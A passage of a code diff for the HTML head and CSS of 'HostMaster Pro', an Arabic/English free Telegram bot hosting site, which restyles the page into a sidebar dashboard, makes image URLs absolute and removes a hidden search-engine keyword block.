@@ -25,7 +25,7 @@
     <meta property="og:locale:alternate" content="en_US">
     <meta property="og:url" content="https://hostingtelegramfacebook.github.io/Hosting_bot/">
     <meta property="og:site_name" content="HostMaster Pro">
-    <meta property="og:image" content="./1000010437.png">
+    <meta property="og:image" content="https://hostingtelegramfacebook.github.io/Hosting_bot/1000010437.png">
     <meta property="og:image:width" content="512">
     <meta property="og:image:height" content="512">
     <meta property="og:image:alt" content="HostMaster Pro - منصة استضافة بوتات تليجرام">
@@ -35,7 +35,7 @@
     <meta name="twitter:title" content="HostMaster Pro - منصة استضافة بوتات تليجرام المجانية">
     <meta name="twitter:description" content="استضافة مجانية احترافية لبوتات تليجرام، ملفات بايثون، جافاسكريبت">
     <meta name="twitter:site" content="@HostMasterPro">
-    <meta name="twitter:image" content="./1000010437.png">
+    <meta name="twitter:image" content="https://hostingtelegramfacebook.github.io/Hosting_bot/1000010437.png">
     
     <!-- Structured Data -->
     <script type="application/ld+json">
@@ -45,7 +45,7 @@
         "name": "HostMaster Pro",
         "description": "منصة استضافة مجانية احترافية لبوتات تليجرام وملفات البرمجة",
         "url": "https://hostingtelegramfacebook.github.io/Hosting_bot/",
-        "image": "./1000010437.png",
+        "image": "https://hostingtelegramfacebook.github.io/Hosting_bot/1000010437.png",
         "applicationCategory": "DeveloperApplication",
         "operatingSystem": "Any",
         "offers": {
@@ -63,7 +63,7 @@
             "name": "HostMaster Pro",
             "logo": {
                 "@type": "ImageObject",
-                "url": "./1000010437.png"
+                "url": "https://hostingtelegramfacebook.github.io/Hosting_bot/1000010437.png"
             },
             "url": "https://hostingtelegramfacebook.github.io/Hosting_bot/"
         },
@@ -72,28 +72,11 @@
     }
     </script>
     
-    <!-- Additional Schema Markup -->
-    <script type="application/ld+json">
-    {
-        "@context": "https://schema.org",
-        "@type": "BreadcrumbList",
-        "itemListElement": [{
-            "@type": "ListItem",
-            "position": 1,
-            "name": "الرئيسية",
-            "item": "https://hostingtelegramfacebook.github.io/Hosting_bot/"
-        }]
-    }
-    </script>
-    
     <!-- Favicon -->
-    <link rel="icon" type="image/x-icon" href="./1000010437.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="./1000010437.png">
-    <link rel="apple-touch-icon" sizes="180x180" href="./1000010437.png">
-    <link rel="shortcut icon" href="./1000010437.png">
-    
-    <!-- Sitemap and RSS -->
-    <link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap.xml">
+    <link rel="icon" href="https://hostingtelegramfacebook.github.io/Hosting_bot/1000010437.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://hostingtelegramfacebook.github.io/Hosting_bot/1000010437.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://hostingtelegramfacebook.github.io/Hosting_bot/1000010437.png">
+    <link rel="shortcut icon" href="https://hostingtelegramfacebook.github.io/Hosting_bot/1000010437.png">
     
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -104,13 +87,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        /* Reset & Base Styles */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         :root {
             --primary-color: #3b82f6;
             --primary-dark: #2563eb;
@@ -125,9 +101,16 @@
             --text-secondary: #cbd5e1;
             --text-muted: #94a3b8;
             --border-color: rgba(255, 255, 255, 0.1);
+            --sidebar-bg: rgba(15, 23, 42, 0.95);
             --shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
             --border-radius: 16px;
             --transition: all 0.3s ease;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
         
         body {
@@ -136,7 +119,6 @@
             color: var(--text-primary);
             min-height: 100vh;
             overflow-x: hidden;
-            position: relative;
         }
         
         body.en {
@@ -144,480 +126,169 @@
             direction: ltr;
         }
         
-        /* SEO Content - Hidden but accessible to search engines */
-        .seo-content {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            padding: 0;
-            margin: -1px;
-            overflow: hidden;
-            clip: rect(0,0,0,0);
-            border: 0;
-            white-space: nowrap;
-        }
-        
-        /* Background Animation */
-        .bg-animation {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            overflow: hidden;
-            pointer-events: none;
-        }
-        
-        .bg-circle {
-            position: absolute;
-            border-radius: 50%;
-            background: radial-gradient(circle, var(--primary-color) 0%, transparent 70%);
-            opacity: 0.1;
-            animation: float 20s infinite linear;
-        }
-        
-        .circle-1 {
-            width: 400px;
-            height: 400px;
-            top: -100px;
-            right: -100px;
-            animation-delay: 0s;
-        }
-        
-        .circle-2 {
-            width: 300px;
-            height: 300px;
-            bottom: -100px;
-            left: -50px;
-            animation-delay: 5s;
-            background: radial-gradient(circle, var(--secondary-color) 0%, transparent 70%);
-        }
-        
-        .circle-3 {
-            width: 200px;
-            height: 200px;
-            top: 50%;
-            right: 20%;
-            animation-delay: 10s;
-            background: radial-gradient(circle, var(--success-color) 0%, transparent 70%);
-        }
-        
-        @keyframes float {
-            0% { transform: translate(0, 0) rotate(0deg); }
-            33% { transform: translate(30px, -50px) rotate(120deg); }
-            66% { transform: translate(-20px, 20px) rotate(240deg); }
-            100% { transform: translate(0, 0) rotate(360deg); }
-        }
-        
-        /* Language Switcher */
-        .language-switcher {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            z-index: 1000;
-        }
-        
-        .lang-btn {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            color: var(--text-secondary);
-            padding: 8px 16px;
-            border-radius: 20px;
-            cursor: pointer;
+        /* Layout */
+        .dashboard-container {
             display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 14px;
-            backdrop-filter: blur(10px);
-            transition: var(--transition);
+            min-height: 100vh;
         }
         
-        .lang-btn:hover {
-            background: rgba(59, 130, 246, 0.2);
-            color: var(--primary-color);
-        }
-        
-        /* Loading Screen */
-        .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: var(--darker-bg);
+        /* Sidebar */
+        .sidebar {
+            width: 260px;
+            background: var(--sidebar-bg);
+            backdrop-filter: blur(20px);
+            border-left: 1px solid var(--border-color);
             display: flex;
             flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            transition: opacity 0.5s ease;
+            transition: var(--transition);
         }
         
-        .loader {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(59, 130, 246, 0.3);
-            border-radius: 50%;
-            border-top-color: var(--primary-color);
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+        .en .sidebar {
+            border-left: none;
+            border-right: 1px solid var(--border-color);
         }
         
-        .loading-text {
-            font-size: 18px;
-            color: var(--text-secondary);
-            margin-top: 15px;
-        }
-        
-        /* Main Container */
-        .main-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            width: 100%;
-            max-width: 100%;
-            overflow: hidden;
-        }
-        
-        /* Auth Container */
-        .auth-container {
-            width: 100%;
-            max-width: 450px;
-            padding: 20px;
-        }
-        
-        .auth-box {
-            background: var(--card-bg);
-            backdrop-filter: blur(20px);
-            border: 1px solid var(--border-color);
-            border-radius: var(--border-radius);
-            padding: 40px 30px;
-            box-shadow: var(--shadow);
-            animation: slideUp 0.5s ease;
-        }
-        
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        /* Branding */
-        .brand {
+        .sidebar-header {
+            padding: 30px 20px;
+            border-bottom: 1px solid var(--border-color);
             text-align: center;
-            margin-bottom: 30px;
         }
         
-        .brand-logo {
+        .logo-container {
             width: 80px;
             height: 80px;
-            background: transparent;
+            margin: 0 auto 15px;
             border: 2px solid var(--primary-color);
             border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
+            padding: 8px;
+            background: rgba(30, 41, 59, 0.5);
             overflow: hidden;
-            padding: 5px;
         }
         
-        .brand-logo img {
+        .logo-container img {
             width: 100%;
             height: 100%;
-            border-radius: 18px;
+            border-radius: 16px;
             object-fit: contain;
         }
         
-        .brand-name {
-            font-size: 28px;
+        .site-title {
+            font-size: 22px;
             font-weight: 700;
             background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
+            margin-bottom: 5px;
         }
         
-        .brand-tagline {
-            color: var(--text-muted);
-            font-size: 15px;
-            line-height: 1.5;
-        }
-        
-        /* Tabs */
-        .auth-tabs {
-            display: flex;
-            background: rgba(15, 23, 42, 0.5);
-            border-radius: 12px;
-            padding: 4px;
-            margin-bottom: 30px;
-        }
-        
-        .tab-btn {
+        /* Navigation */
+        .sidebar-nav {
             flex: 1;
-            padding: 14px;
-            border: none;
-            background: transparent;
+            padding: 20px 0;
+        }
+        
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 15px 25px;
             color: var(--text-secondary);
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 15px;
-            font-weight: 600;
-            transition: var(--transition);
-        }
-        
-        .tab-btn.active {
-            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
-            color: white;
-            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
-        }
-        
-        /* Forms */
-        .form-container {
-            margin-bottom: 20px;
-        }
-        
-        .form-group {
-            margin-bottom: 25px;
-        }
-        
-        .form-label {
-            display: block;
-            color: var(--text-secondary);
-            margin-bottom: 8px;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        
-        .input-group {
-            position: relative;
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 16px 20px;
-            background: rgba(15, 23, 42, 0.6);
-            border: 2px solid var(--border-color);
-            border-radius: 12px;
-            color: var(--text-primary);
-            font-size: 15px;
-            transition: var(--transition);
-            font-family: inherit;
-        }
-        
-        .form-input:focus {
-            outline: none;
-            border-color: var(--primary-color);
-            background: rgba(15, 23, 42, 0.8);
-        }
-        
-        .input-icon {
-            position: absolute;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--text-muted);
-        }
-        
-        .ar .input-icon {
-            right: 20px;
-        }
-        
-        .en .input-icon {
-            left: 20px;
-        }
-        
-        /* Buttons */
-        .btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: var(--transition);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            font-family: inherit;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
-            color: white;
-        }
-        
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.4);
-        }
-        
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-            color: var(--text-secondary);
-            border: 1px solid var(--border-color);
-            margin-top: 15px;
-        }
-        
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.15);
-        }
-        
-        /* Features */
-        .features {
-            margin-top: 30px;
-            padding-top: 30px;
-            border-top: 1px solid var(--border-color);
-        }
-        
-        .feature-item {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-bottom: 15px;
-            color: var(--text-muted);
-            font-size: 14px;
-        }
-        
-        .feature-icon {
-            width: 32px;
-            height: 32px;
-            background: rgba(59, 130, 246, 0.1);
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-        
-        .feature-icon i {
-            color: var(--primary-color);
-            font-size: 14px;
-        }
-        
-        /* Dashboard */
-        .dashboard {
-            display: none;
-            width: 100%;
-            min-height: 100vh;
-        }
-        
-        /* Top Navigation */
-        .top-nav {
-            background: rgba(15, 23, 42, 0.95);
-            backdrop-filter: blur(20px);
-            padding: 18px 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid var(--border-color);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-        
-        .nav-brand {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .nav-logo {
-            width: 40px;
-            height: 40px;
-            background: transparent;
-            border: 2px solid var(--primary-color);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            padding: 3px;
-        }
-        
-        .nav-logo img {
-            width: 100%;
-            height: 100%;
-            border-radius: 8px;
-            object-fit: contain;
-        }
-        
-        .nav-title {
-            font-size: 20px;
-            font-weight: 700;
-            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        /* User Menu */
-        .user-menu {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-        
-        .user-info {
-            text-align: right;
-        }
-        
-        .en .user-info {
-            text-align: left;
-        }
-        
-        .user-name {
-            font-weight: 600;
-            color: var(--text-primary);
-            font-size: 15px;
-        }
-        
-        .user-role {
-            font-size: 13px;
-            color: var(--text-muted);
-        }
-        
-        .btn-logout {
-            background: rgba(239, 68, 68, 0.1);
-            color: #fecaca;
-            border: 1px solid rgba(239, 68, 68, 0.2);
-            padding: 8px 20px;
-            border-radius: 8px;
-            cursor: pointer;
             text-decoration: none;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 14px;
             transition: var(--transition);
+            border-right: 3px solid transparent;
+            margin-bottom: 5px;
         }
         
-        .btn-logout:hover {
-            background: rgba(239, 68, 68, 0.2);
+        .en .nav-item {
+            border-right: none;
+            border-left: 3px solid transparent;
+        }
+        
+        .nav-item:hover {
+            background: rgba(59, 130, 246, 0.1);
+            color: var(--primary-color);
+        }
+        
+        .nav-item.active {
+            background: rgba(59, 130, 246, 0.2);
+            color: var(--primary-color);
+            border-right-color: var(--primary-color);
+        }
+        
+        .en .nav-item.active {
+            border-left-color: var(--primary-color);
+        }
+        
+        .nav-icon {
+            width: 24px;
+            text-align: center;
         }
         
         /* Main Content */
         .main-content {
-            padding: 30px;
-            max-width: 1400px;
-            margin: 0 auto;
-            width: 100%;
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
         }
         
-        /* Stats Grid */
+        /* Header */
+        .main-header {
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            border-radius: var(--border-radius);
+            padding: 20px 30px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header-title {
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .header-actions {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .user-avatar {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 18px;
+        }
+        
+        .user-details h3 {
+            font-size: 16px;
+            margin-bottom: 3px;
+        }
+        
+        .user-details p {
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+        
+        /* Stats Cards */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 25px;
-            margin-bottom: 40px;
+            gap: 20px;
+            margin-bottom: 30px;
         }
         
         .stat-card {
@@ -625,8 +296,8 @@
             border: 1px solid var(--border-color);
             border-radius: var(--border-radius);
             padding: 25px;
-            transition: var(--transition);
             backdrop-filter: blur(10px);
+            transition: var(--transition);
         }
         
         .stat-card:hover {
@@ -634,21 +305,15 @@
             border-color: rgba(59, 130, 246, 0.3);
         }
         
-        .stat-header {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-        
         .stat-icon {
-            width: 60px;
-            height: 60px;
+            width: 50px;
+            height: 50px;
             background: rgba(59, 130, 246, 0.1);
             border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
+            margin-bottom: 15px;
         }
         
         .stat-icon i {
@@ -656,45 +321,120 @@
             color: var(--primary-color);
         }
         
-        .stat-title {
-            font-size: 14px;
-            color: var(--text-muted);
-            margin-bottom: 5px;
-        }
-        
         .stat-value {
             font-size: 28px;
             font-weight: 700;
-            color: var(--text-primary);
+            margin-bottom: 5px;
         }
         
-        /* Upload Section */
-        .upload-section {
+        .stat-label {
+            color: var(--text-muted);
+            font-size: 14px;
+        }
+        
+        /* Sections */
+        .content-section {
             background: var(--card-bg);
             border: 1px solid var(--border-color);
             border-radius: var(--border-radius);
             padding: 30px;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
             backdrop-filter: blur(10px);
         }
         
         .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             margin-bottom: 25px;
         }
         
         .section-title {
-            font-size: 22px;
-            color: var(--text-primary);
-            margin-bottom: 10px;
+            font-size: 20px;
+            font-weight: 600;
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
         }
         
-        .section-subtitle {
+        /* Files Section */
+        .files-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        
+        .file-card {
+            background: rgba(15, 23, 42, 0.5);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            transition: var(--transition);
+        }
+        
+        .file-card:hover {
+            border-color: var(--primary-color);
+            transform: translateY(-3px);
+        }
+        
+        .file-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .file-icon {
+            width: 50px;
+            height: 50px;
+            background: rgba(59, 130, 246, 0.1);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .file-icon i {
+            font-size: 24px;
+            color: var(--primary-color);
+        }
+        
+        .file-info h4 {
+            font-size: 16px;
+            margin-bottom: 5px;
+            word-break: break-all;
+        }
+        
+        .file-info p {
             color: var(--text-muted);
-            font-size: 15px;
-            line-height: 1.6;
+            font-size: 13px;
+        }
+        
+        .file-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .btn-action {
+            flex: 1;
+            padding: 8px;
+            border: 1px solid var(--border-color);
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-secondary);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            font-size: 13px;
+        }
+        
+        .btn-action:hover {
+            background: rgba(59, 130, 246, 0.1);
+            color: var(--primary-color);
         }
         
         /* Upload Zone */
@@ -704,9 +444,9 @@
             padding: 60px 20px;
             text-align: center;
             cursor: pointer;
-            position: relative;
             transition: var(--transition);
             background: rgba(15, 23, 42, 0.3);
+            margin-bottom: 20px;
         }
         
         .upload-zone:hover {
@@ -741,84 +481,200 @@
             cursor: pointer;
         }
         
-        /* File Types */
-        .file-types {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin-top: 25px;
+        /* Control Panel */
+        .control-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
         }
         
-        .file-type-tag {
+        .control-card {
+            background: rgba(15, 23, 42, 0.5);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .control-icon {
+            width: 60px;
+            height: 60px;
             background: rgba(59, 130, 246, 0.1);
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 13px;
-            color: #93c5fd;
+            border-radius: 50%;
             display: flex;
             align-items: center;
-            gap: 6px;
+            justify-content: center;
+            margin: 0 auto 20px;
         }
         
-        /* Progress */
-        .upload-progress {
-            margin-top: 30px;
-            display: none;
-        }
-        
-        .progress-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        
-        .progress-title {
-            color: var(--text-primary);
-            font-weight: 500;
-        }
-        
-        .progress-percent {
+        .control-icon i {
+            font-size: 28px;
             color: var(--primary-color);
-            font-weight: 600;
         }
         
-        .progress-bar {
-            height: 8px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-            overflow: hidden;
+        .control-title {
+            font-size: 18px;
             margin-bottom: 10px;
         }
         
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
-            width: 0%;
-            transition: width 0.3s ease;
+        .control-desc {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
         }
         
-        /* Alerts */
-        .alert {
-            padding: 16px 20px;
+        .btn-control {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        
+        .btn-control:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(59, 130, 246, 0.3);
+        }
+        
+        .btn-control.stop {
+            background: linear-gradient(90deg, var(--danger-color), #dc2626);
+        }
+        
+        /* Terminal */
+        .terminal-container {
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid var(--border-color);
             border-radius: 12px;
+            overflow: hidden;
+        }
+        
+        .terminal-header {
+            background: rgba(30, 41, 59, 0.8);
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .terminal-title {
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        .terminal-controls {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn-terminal {
+            padding: 5px 15px;
+            border: 1px solid var(--border-color);
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-secondary);
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        
+        .terminal-body {
+            padding: 20px;
+            font-family: monospace;
+            font-size: 14px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .terminal-line {
+            margin-bottom: 10px;
+            line-height: 1.5;
+        }
+        
+        .terminal-line.success {
+            color: var(--success-color);
+        }
+        
+        .terminal-line.error {
+            color: var(--danger-color);
+        }
+        
+        .terminal-line.info {
+            color: var(--text-muted);
+        }
+        
+        /* Settings Form */
+        .settings-form {
+            max-width: 600px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 14px 20px;
+            background: rgba(15, 23, 42, 0.6);
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            color: var(--text-primary);
+            font-size: 15px;
+            transition: var(--transition);
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+        }
+        
+        .form-select {
+            width: 100%;
+            padding: 14px 20px;
+            background: rgba(15, 23, 42, 0.6);
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            color: var(--text-primary);
+            font-size: 15px;
+            cursor: pointer;
+        }
+        
+        .btn-save {
+            padding: 14px 30px;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        
+        .btn-save:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(59, 130, 246, 0.3);
+        }
+        
+        /* Alert */
+        .alert {
+            padding: 15px 20px;
+            border-radius: 10px;
             margin-bottom: 20px;
             display: none;
             align-items: center;
             gap: 12px;
-            animation: slideDown 0.3s ease;
-        }
-        
-        @keyframes slideDown {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         
         .alert-success {
@@ -833,113 +689,91 @@
             color: #f87171;
         }
         
-        /* Responsive Design */
+        /* Footer Links */
+        .footer-links {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border-color);
+            text-align: center;
+        }
+        
+        .footer-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            margin: 0 10px;
+            transition: var(--transition);
+        }
+        
+        .footer-links a:hover {
+            color: var(--primary-color);
+        }
+        
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .dashboard-container {
+                flex-direction: column;
+            }
+            
+            .sidebar {
+                width: 100%;
+                flex-direction: row;
+                overflow-x: auto;
+                padding: 10px;
+            }
+            
+            .sidebar-header {
+                display: none;
+            }
+            
+            .sidebar-nav {
+                display: flex;
+                flex: 1;
+                padding: 0;
+            }
+            
+            .nav-item {
+                flex-direction: column;
+                padding: 10px 15px;
+                font-size: 12px;
+                text-align: center;
+                min-width: 100px;
+            }
+            
+            .nav-icon {
+                margin-bottom: 5px;
+            }
+        }
+        
         @media (max-width: 768px) {
-            .main-container {
+            .main-content {
                 padding: 15px;
             }
             
-            .auth-box {
-                padding: 30px 20px;
-            }
-            
-            .top-nav {
-                padding: 15px 20px;
+            .main-header {
                 flex-direction: column;
                 gap: 15px;
                 text-align: center;
-            }
-            
-            .user-menu {
-                width: 100%;
-                justify-content: space-between;
-            }
-            
-            .main-content {
-                padding: 20px 15px;
             }
             
             .stats-grid {
                 grid-template-columns: 1fr;
             }
             
-            .upload-zone {
-                padding: 40px 15px;
+            .files-grid {
+                grid-template-columns: 1fr;
             }
             
-            .upload-icon {
-                font-size: 36px;
+            .control-grid {
+                grid-template-columns: 1fr;
             }
             
-            .file-types {
-                gap: 8px;
-            }
-            
-            .file-type-tag {
-                padding: 6px 12px;
-                font-size: 12px;
+            .user-info {
+                flex-direction: column;
+                text-align: center;
             }
         }
         
-        @media (max-width: 480px) {
-            .brand-logo {
-                width: 60px;
-                height: 60px;
-            }
-            
-            .brand-name {
-                font-size: 24px;
-            }
-            
-            .tab-btn {
-                padding: 12px;
-                font-size: 14px;
-            }
-            
-            .form-input {
-                padding: 14px 16px;
-            }
-            
-            .btn {
-                padding: 14px;
-                font-size: 15px;
-            }
-            
-            .language-switcher {
-                top: 10px;
-                left: 10px;
-            }
-            
-            .nav-logo {
-                width: 35px;
-                height: 35px;
-            }
-        }
-        
-        /* Utilities */
-        .hidden {
-            display: none !important;
-        }
-        
-        .text-center {
-            text-align: center;
-        }
-        
-        .mt-20 {
-            margin-top: 20px;
-        }
-        
-        .mb-20 {
-            margin-bottom: 20px;
-        }
-        
-        /* No horizontal scroll */
-        html, body {
-            max-width: 100%;
-            overflow-x: hidden;
-        }
-        
-        /* Scrollbar Styling */
+        /* Scrollbar */
         ::-webkit-scrollbar {
             width: 8px;
         }
@@ -952,105 +786,240 @@
             background: rgba(59, 130, 246, 0.5);
             border-radius: 4px;
         }
-        
-        ::-webkit-scrollbar-thumb:hover {
-            background: rgba(59, 130, 246, 0.8);
-        }
-        
-        /* SEO Content Styling */
-        .seo-content h1 {
-            color: var(--primary-color);
-            font-size: 24px;
-            margin-bottom: 15px;
-        }
-        
-        .seo-content h2 {
-            color: var(--secondary-color);
-            font-size: 20px;
-            margin: 15px 0 10px;
-        }
-        
-        .seo-content h3 {
-            color: var(--text-primary);
-            font-size: 18px;
-            margin: 12px 0 8px;
-        }
-        
-        .seo-content p {
-            color: var(--text-secondary);
-            line-height: 1.6;
-            margin-bottom: 10px;
-        }
-        
-        .seo-content ul, .seo-content ol {
-            color: var(--text-muted);
-            margin: 10px 0 10px 20px;
-        }
-        
-        .seo-content li {
-            margin-bottom: 5px;
-        }
-        
-        .seo-content strong {
-            color: var(--primary-color);
-        }
     </style>
 </head>
 <body class="ar">
-    <!-- SEO Content for search engines only -->
-    <div class="seo-content">
-        <h1>HostMaster Pro - منصة استضافة بوتات تليجرام المجانية</h1>
-        <h2>استضافة بوت تليجرام احترافية مجانية 2026</h2>
-        
-        <p>HostMaster Pro هي أفضل منصة استضافة عربية مجانية متخصصة في <strong>استضافة بوتات تليجرام</strong>، <strong>استضافة ملفات بايثون</strong>، <strong>استضافة جافاسكريبت</strong>، و<strong>استضافة المكتبات البرمجية</strong>. تقدّم خدمات استضافة سحابية آمنة مع واجهة مستخدم عربية/إنجليزية.</p>
-        
-        <h3>مميزات منصة استضافة HostMaster Pro:</h3>
-        <ul>
-            <li>✅ استضافة مجانية 100% لبوتات التليجرام</li>
-            <li>✅ دعم كامل لملفات Python (.py) و JavaScript (.js)</li>
-            <li>✅ رفع ملفات ZIP والمكتبات البرمجية</li>
-            <li>✅ تخزين سحابي غير محدود وآمن</li>
-            <li>✅ واجهة استخدام باللغة العربية والإنجليزية</li>
-            <li>✅ إشعارات فورية عبر بوت تليجرام</li>
-            <li>✅ أداء عالي وسرعة فائقة</li>
-            <li>✅ حماية متقدمة وأمان تام</li>
-        </ul>
-        
-        <h3>كيفية استضافة بوت تليجرام مجاناً:</h3>
-        <ol>
-            <li>سجّل الدخول إلى منصة HostMaster Pro</li>
-            <li>انقر على زر رفع الملفات</li>
-            <li>اختر ملفات بوت التليجرام (Python/JavaScript)</li>
-            <li>انتظر اكتمال الرفع إلى السحابة</li>
-            <li>احصل على رابط تشغيل البوت الفوري</li>
-        </ol>
-        
-        <h3>الكلمات المفتاحية:</h3>
